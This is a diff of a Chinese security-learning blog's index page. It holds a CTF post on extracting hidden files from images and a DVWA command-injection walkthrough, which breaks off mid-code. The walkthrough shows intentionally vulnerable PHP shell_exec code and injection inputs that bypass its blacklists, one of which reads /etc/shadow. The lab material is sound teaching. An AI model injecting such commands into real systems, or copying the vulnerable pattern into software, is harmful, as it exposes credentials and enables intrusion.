@@ -134,106 +134,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
-  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
-<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
-<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
-<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
-<p>像这张图片，发现隐藏着flag.txt</p>
-<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
-<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
-<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
-<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
-<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
-<p><strong>if</strong>：要提取分离的文件</p>
-<p><strong>of</strong>：输出的文件</p>
-<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
-<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
-<hr>
-<p>这篇文章只做简单的介绍</p>
-<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF杂项</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-BugKuCTF—杂项题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -416,6 +316,370 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—杂项题 第1-10关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
+  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
+<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
+<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
+<p>像这张图片，发现隐藏着flag.txt</p>
+<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
+<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
+<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
+<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
+<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
+<p><strong>if</strong>：要提取分离的文件</p>
+<p><strong>of</strong>：输出的文件</p>
+<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
+<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
+<hr>
+<p>这篇文章只做简单的介绍</p>
+<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF杂项</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/">DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/" class="archive-article-date">
+  	<time datetime="2019-02-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-DVWA 2-Command Injection（命令注入）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/11/DVWA 2-Command Injection（命令注入）/">DVWA 2-Command Injection（命令注入）</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/11/DVWA 2-Command Injection（命令注入）/" class="archive-article-date">
+  	<time datetime="2019-02-10T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\exec\source\</span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	$html .= <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>stristr()</code>函数：返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到结尾的字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stristr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] ) : string</span><br><span class="line"></span><br><span class="line">haystack:在该字符串中查找。</span><br><span class="line"></span><br><span class="line">needle:如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符顺序值。</span><br><span class="line"></span><br><span class="line">before_needle:若为 TRUE，strstr() 将返回 needle 在 haystack 中的位置之前的部分(不包括 needle)。</span><br><span class="line"></span><br><span class="line">参数 needle 和 haystack 将以不区分大小写的方式对待。</span><br></pre></td></tr></table></figure>
+<p><code>php_uname()</code>函数：返回了运行 PHP 的操作系统的描述。 这和 <a href="https://www.php.net/manual/zh/function.phpinfo.php" target="_blank" rel="noopener">phpinfo()</a> 最顶端上输出的是同一个字符串。 如果仅仅要获取操作系统的名称。可以考虑使用常量 PHP_OS，不过要注意该常量会包含 PHP 构建（<em>built</em>）时的操作系统名。</p>
+<p>在一些旧的 UNIX 平台，它有可能无法检测到当前系统的信息，然后会还原显示成构建 PHP 时的系统信息。 这仅仅在你的 uname() 函数库不存在或无法运行时发生。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php_uname ([ string $mode = &quot;a&quot; ] ) : string</span><br><span class="line"></span><br><span class="line">mode：是单个字符，用于定义要返回什么信息：</span><br><span class="line"></span><br><span class="line">&apos;a&apos;：此为默认。包含序列 &quot;s n r v m&quot; 里的所有模式。</span><br><span class="line">&apos;s&apos;：操作系统名称。例如： FreeBSD。</span><br><span class="line">&apos;n&apos;：主机名。例如： localhost.example.com。</span><br><span class="line">&apos;r&apos;：版本名称，例如： 5.1.2-RELEASE。</span><br><span class="line">&apos;v&apos;：版本信息。操作系统之间有很大的不同。</span><br><span class="line">&apos;m&apos;：机器类型。例如：i386。</span><br></pre></td></tr></table></figure>
+<p>可以看到，通过<code>stristr()</code>和<code>php_uname()</code>这两个函数判断操作系统的类型，不同类型执行不同的shell命令</p>
+<p>Window和Linux系统都可以用<code>&amp;&amp;</code>来执行多条命令，比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; net user</span><br></pre></td></tr></table></figure>
+<p>可以看到，返回的信息分为两部分，分别是<code>ping 127.0.0.1</code>和<code>net user</code>的返回</p>
+<p><img src alt="2-1"></p>
+<p><img src alt="2-2"></p>
+<p>Linux下输入<code>127.0.0.1&amp;&amp;cat /etc/shadow</code>甚至可以读取<code>shadow</code>文件，可见危害之大</p>
+<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set blacklist</span></span><br><span class="line">	$substitutions = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	$html .= <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从代码中可以看出来，对<code>&amp;&amp;</code>和<code>;</code>进行了过滤。</p>
+<p><img src alt="2-3"></p>
+<p>但是<code>单个&amp;</code>却还可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; net user</span><br></pre></td></tr></table></figure>
+<p><img src alt="2-4"></p>
+<p>这里需要注意的是<code>&amp;&amp;</code>与<code>&amp;</code>的区别：</p>
+<p>Command 1 &amp;&amp; Command 2</p>
+<p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p>
+<p><img src alt="2-5"></p>
+<p>Command 1 &amp; Command 2</p>
+<p>先执行Command 1，不管是否成功，都会执行Command 2</p>
+<p><img src alt="2-6"></p>
+<p>本题还有一种绕过的方法，就是<code>&amp;;&amp;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;;&amp; net user</span><br></pre></td></tr></table></figure>
+<p><img src alt="2-7"></p>
+<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set blacklist</span></span><br><span class="line">	$substitutions = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'| '</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	$html .= <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对比与Medium难度，High难度进一步对黑名单进行了完善</p>
+<p>但是这里注意被过滤的<code>&#39;| &#39;</code>，<code>管道符|</code>后面是有一个空格的，所以这里不加空格的单个<code>|</code>就可以不被过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|net user</span><br></pre></td></tr></table></figure>
+<p><img src alt="2-8"></p>
+<p>Command 1 | Command 2</p>
+<p>| 是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
+<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">	$target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">	$octet = explode( <span class="string">"."</span>, $target );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">	<span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// If all 4 octets are int's put the IP back together.</span></span><br><span class="line">		$target = $octet[<span class="number">0</span>] . <span class="string">'.'</span> . $octet[<span class="number">1</span>] . <span class="string">'.'</span> . $octet[<span class="number">2</span>] . <span class="string">'.'</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">		<span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">			<span class="comment">// Windows</span></span><br><span class="line">			$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// *nix</span></span><br><span class="line">			$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">		